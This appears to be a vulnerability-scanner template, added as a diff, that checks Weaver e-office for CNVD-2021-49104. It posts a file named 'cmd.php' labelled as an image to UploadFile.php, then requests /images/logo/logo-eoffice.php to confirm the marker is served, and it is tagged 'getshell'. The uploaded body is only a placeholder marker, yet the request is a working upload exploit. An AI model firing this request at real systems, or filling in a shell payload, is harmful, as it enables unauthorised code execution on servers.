@@ -1,0 +1,33 @@
+name: Weaver e office UploadFile.php file upload CNVD-2021-49104
+manual: true
+query: app="EOffice"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+      headers:
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+      body: |-
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="cmd.php"
+        Content-Type: image/jpeg
+
+        {{flag}}
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"logo-eoffice.php")
+  r1:
+    request:
+      method: GET
+      path: /images/logo/logo-eoffice.php
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"{{flag}}")
+expression: r0() && r1()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  tags: getshell
